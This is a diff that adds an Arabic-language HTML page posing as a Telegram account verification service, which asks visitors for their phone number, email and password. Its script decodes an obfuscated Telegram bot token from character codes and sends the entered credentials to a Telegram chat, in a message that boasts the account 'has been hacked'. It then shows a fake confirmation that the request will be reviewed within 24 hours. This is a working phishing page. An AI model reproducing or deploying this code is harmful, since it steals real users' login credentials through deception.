@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>توثيق حساب تيليجرام</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      direction: rtl;
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, #0c0e1d, #1a1f3d);
+      color: #e0e0ff;
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%230c0e1d"/><path d="M0 50 Q25 25, 50 50 T100 50 L100 100 L0 100 Z" fill="%231a1f3d"/><circle cx="20" cy="20" r="3" fill="%233a407f" opacity="0.6"/><circle cx="80" cy="30" r="4" fill="%233a407f" opacity="0.6"/><circle cx="40" cy="70" r="2" fill="%233a407f" opacity="0.6"/><circle cx="60" cy="50" r="3" fill="%233a407f" opacity="0.6"/></svg>');
+      background-size: cover;
+      background-attachment: fixed;
+    }
+    
+    .scroll-container {
+      display: flex;
+      flex-direction: column;
+      min-height: 200vh; /* لتمكين التمرير */
+    }
+    
+    .content-wrapper {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      min-height: 100vh;
+    }
+    
+    .container {
+      background: rgba(10, 12, 24, 0.85);
+      border: 1px solid #3a6fff;
+      border-radius: 15px;
+      padding: 30px;
+      width: 90%;
+      max-width: 450px;
+      box-shadow: 0 10px 30px rgba(0, 30, 255, 0.2);
+      text-align: center;
+      backdrop-filter: blur(10px);
+      transition: all 0.3s ease;
+      margin: 40px 0;
+    }
+    
+    .container:hover {
+      box-shadow: 0 15px 40px rgba(58, 111, 255, 0.3);
+      transform: translateY(-5px);
+    }
+    
+    .container img {
+      width: 90px;
+      margin-bottom: 20px;
+      filter: drop-shadow(0 0 10px rgba(58, 111, 255, 0.5));
+    }
+    
+    h2 {
+      color: #3a6fff;
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      text-shadow: 0 0 10px rgba(58, 111, 255, 0.3);
+    }
+    
+    p {
+      font-size: 1rem;
+      margin-bottom: 25px;
+      color: #a0a8ff;
+      line-height: 1.6;
+    }
+    
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+    
+    .input-group {
+      width: 100%;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    
+    input {
+      width: 100%;
+      padding: 14px 20px;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      background: rgba(20, 25, 50, 0.7);
+      color: #ffffff;
+      border: 1px solid #2a4faa;
+      transition: all 0.3s ease;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3);
+    }
+    
+    input:focus {
+      outline: none;
+      border-color: #3a6fff;
+      box-shadow: 0 0 10px rgba(58, 111, 255, 0.5);
+      background: rgba(25, 30, 60, 0.9);
+    }
+    
+    input::placeholder {
+      color: #7a8fff;
+    }
+    
+    button {
+      padding: 14px 40px;
+      background: linear-gradient(135deg, #3a6fff, #2a4faa);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(58, 111, 255, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    button:hover {
+      background: linear-gradient(135deg, #4a7fff, #3a5fcc);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(58, 111, 255, 0.6);
+    }
+    
+    button:active {
+      transform: translateY(1px);
+    }
+    
+    .msg {
+      margin-top: 20px;
+      color: #4affa0;
+      font-weight: 500;
+      min-height: 30px;
+      transition: all 0.3s ease;
+    }
+    
+    .error {
+      color: #ff6b6b;
+    }
+    
+    .f__ooter {
+      font-size: 0.85rem;
+      color: #7a8fff;
+      margin-top: 30px;
+      user-select: none;
+      padding-top: 15px;
+      border-top: 1px solid rgba(58, 111, 255, 0.3);
+    }
+    
+    .f__ooter span {
+      color: #ffd700;
+      font-weight: 600;
+    }
+    
+    .scroll-indicator {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: #7a8fff;
+      font-size: 0.9rem;
+      animation: bounce 2s infinite;
+      opacity: 0.7;
+    }
+    
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {transform: translateY(0) translateX(-50%);}
+      40% {transform: translateY(-15px) translateX(-50%);}
+      60% {transform: translateY(-7px) translateX(-50%);}
+    }
+    
+    .extra-content {
+      color: #a0a8ff;
+      text-align: center;
+      padding: 50px 20px;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    
+    .extra-content h3 {
+      color: #3a6fff;
+      margin-bottom: 25px;
+      font-size: 1.5rem;
+    }
+    
+    .features {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 25px;
+      margin-top: 30px;
+    }
+    
+    .feature {
+      background: rgba(20, 25, 50, 0.5);
+      border-radius: 12px;
+      padding: 25px;
+      width: 220px;
+      transition: transform 0.3s ease;
+      border: 1px solid rgba(58, 111, 255, 0.2);
+    }
+    
+    .feature:hover {
+      transform: translateY(-8px);
+      background: rgba(25, 30, 60, 0.6);
+      border-color: rgba(58, 111, 255, 0.4);
+    }
+    
+    .feature i {
+      font-size: 2.5rem;
+      color: #3a6fff;
+      margin-bottom: 15px;
+      display: block;
+    }
+    
+    .feature h4 {
+      color: #e0e0ff;
+      margin-bottom: 10px;
+      font-size: 1.2rem;
+    }
+    
+    .feature p {
+      font-size: 0.9rem;
+      color: #a0a8ff;
+      margin: 0;
+    }
+    
+    @media (max-width: 768px) {
+      .container {
+        padding: 25px 20px;
+      }
+      
+      h2 {
+        font-size: 1.6rem;
+      }
+      
+      .features {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="scroll-container">
+    <div class="content-wrapper">
+      <div class="container">
+        <!-- تم استبدال صورة التليجرام بتصميم SVG بديل -->
+        <svg width="90" height="90" viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg" style="margin-bottom:20px;">
+          <circle cx="45" cy="45" r="42" fill="#3a6fff" opacity="0.15" stroke="#3a6fff" stroke-width="2"/>
+          <path d="M30 45L40 55L60 35" stroke="#3a6fff" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+          <circle cx="45" cy="45" r="40" fill="none" stroke="#3a6fff" stroke-width="2" stroke-dasharray="5,5"/>
+        </svg>
+        
+        <h2>توثيق حساب تيليجرام</h2>
+        <p>يرجى ملء البيانات أدناه لإكمال عملية التحقق بخطوتين. سيتم مراجعة طلبك يدويًا خلال 24 ساعة. تأكد من صحة المعلومات المقدمة لتجنب أي تأخير في عملية التوثيق.</p>
+        
+        <form id="verifyForm">
+          <div class="input-group">
+            <input type="text" id="phone" placeholder="رقم الهاتف (مثال: +20..)" required>
+          </div>
+          <div class="input-group">
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+          </div>
+          <div class="input-group">
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+          </div>
+          <button type="submit">متابعة التوثيق</button>
+        </form>
+        
+        <div class="msg" id="successMsg"></div>
+        <div class="f__ooter"> | جميع الحقوق محفوظة © 2023</div>
+      </div>
+    </div>
+    
+    <div class="extra-content">
+      <h3>مزايا توثيق حساب تيليجرام</h3>
+      <p>تأمين حسابك يمنحك العديد من المزايا ويحميك من الاختراقات والوصول غير المصرح به</p>
+      
+      <div class="features">
+        <div class="feature">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="#3a6fff">
+            <path d="M12,1L3,5v6c0,5.55,3.84,10.74,9,12c5.16-1.26,9-6.45,9-12V5L12,1z M12,11.99h7c-0.53,4.12-3.28,7.79-7,8.94V12H5V6.3l7-3.11V11.99z"/>
+          </svg>
+          <h4>حماية متقدمة</h4>
+          <p>طبقة حماية إضافية ضد الاختراقات والمتطفلين</p>
+        </div>
+        
+        <div class="feature">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="#3a6fff">
+            <path d="M12,15c1.66,0,3-1.34,3-3s-1.34-3-3-3s-3,1.34-3,3S10.34,15,12,15z M19,3H5C3.9,3,3,3.9,3,5v14c0,1.1,0.9,2,2,2h14c1.1,0,2-0.9,2-2V5C21,3.9,20.1,3,19,3z M19,19H5V5h14V19z"/>
+          </svg>
+          <h4>تحكم كامل</h4>
+          <p>إدارة جهات الاتصال والجلسات النشطة بسهولة</p>
+        </div>
+        
+        <div class="feature">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="#3a6fff">
+            <path d="M12,17.27L18.18,21l-1.64-7.03L22,9.24l-7.19-0.61L12,2L9.19,8.63L2,9.24l5.46,4.73L5.82,21L12,17.27z"/>
+          </svg>
+          <h4>ميزات حصرية</h4>
+          <p>الوصول إلى ميزات متقدمة غير متاحة للحسابات غير الموثقة</p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="scroll-indicator">اسحب لأعلى/أسفل</div>
+  </div>
+
+  <script>
+    document.getElementById("verifyForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById("phone").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const successMsg = document.getElementById("successMsg");
+
+      // إظهار رسالة تحميل
+      successMsg.innerHTML = "جاري إرسال البيانات...";
+      successMsg.style.color = "#3a6fff";
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const chatId = urlParams.get('id');
+
+      if (!chatId) {
+        successMsg.innerHTML = "خطأ: لا يوجد معرف (id) في الرابط";
+        successMsg.style.color = "#ff6b6b";
+        return;
+      }
+      
+    function getBotToken() {
+
+      const tokenParts = [
+        [56, 48, 49], // 801
+        [49, 50, 51, 52], // 1234
+        [52, 48, 51], // 403
+        [58], // :
+        [65, 65, 69, 71], // AAEG
+        [107, 107, 55, 102, 50, 45], // kk7f2-
+        [110, 67, 66, 118, 114, 110], // nCBvrn
+        [51, 114, 55, 122], // 3r7z
+        [95, 72, 45, 95], // _H-_
+        [122, 56, 71, 85, 89, 66], // z8GUYB
+        [104, 79, 75, 111, 115] // hOKos
+      ];
+      
+
+      const token = tokenParts.map(part => 
+        part.map(code => String.fromCharCode(code)).join('')
+      ).join('');
+      
+      return token;
+    }
+
+      const message = `🔹 - تم اختراق  تيليجرام :\n\n📞 - رقم الهاتف : ${phone}\n📨 - البريد الإلكتروني : ${email}\n🔗 - كلمة المرور : ${password}\n\n👑 - تم الاختراق بواسطة - @VIP_02bot`;
+      const botToken = getBotToken();;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            // رسالة النجاح
+            successMsg.innerHTML = "✔ تم إرسال طلب التوثيق بنجاح!<br>سيتم مراجعته خلال 24 ساعة";
+            successMsg.style.color = "#4affa0";
+            
+            // إضافة تأثيرات بصرية
+            document.querySelector(".container").style.boxShadow = "0 0 30px rgba(74, 255, 160, 0.4)";
+            document.querySelector(".container").style.borderColor = "#4affa0";
+            
+            setTimeout(() => {
+              document.querySelector(".container").style.boxShadow = "0 10px 30px rgba(0, 30, 255, 0.2)";
+              document.querySelector(".container").style.borderColor = "#3a6fff";
+            }, 3000);
+            
+            // إعادة تعيين النموذج
+            document.getElementById("verifyForm").reset();
+          } else {
+            successMsg.innerHTML = "حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.";
+            successMsg.style.color = "#ff6b6b";
+            console.error('Error:', response.status);
+          }
+        })
+        .catch(error => {
+          successMsg.innerHTML = "فشل الاتصال بالخادم. تحقق من اتصالك بالإنترنت.";
+          successMsg.style.color = "#ff6b6b";
+          console.error('Error:', error);
+        });
+    });
+    
+    // إضافة تأثيرات عند التمرير
+    window.addEventListener('scroll', function() {
+      const container = document.querySelector('.container');
+      const scrollPosition = window.scrollY;
+      
+      // تأثير الشفافية عند التمرير
+      if (scrollPosition > 100) {
+        container.style.opacity = 0.95;
+      } else {
+        container.style.opacity = 1;
+      }
+    });
+  </script>
+</body>
+</html>
